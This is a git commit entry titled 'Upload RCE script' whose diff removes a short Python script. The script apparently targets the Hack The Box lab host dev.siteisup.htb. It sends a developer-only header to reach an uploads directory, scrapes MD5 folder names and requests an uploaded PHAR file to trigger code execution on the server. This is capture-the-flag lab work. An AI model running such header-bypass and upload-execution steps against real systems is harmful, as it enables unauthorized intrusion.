b40bea23f147f0fc09ee2a195365e316288aa17c
akhils911dev <dev.akhils911@gmail.com>
2022-10-23 21:12:05 +0530

    Upload RCE script

--- updown/rce.py
+++
@@ -1,9 +0,0 @@
-import requests
-import re
-
-header = {"Special-Dev": "only4dev"}
-r = requests.get("http://dev.siteisup.htb/uploads/",headers=header)
-md5 = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])',r.text)
-
-file_get = requests.get("http://dev.siteisup.htb/uploads/"+md5[1]+"/test.phar",headers=header)
-print(file_get.text)
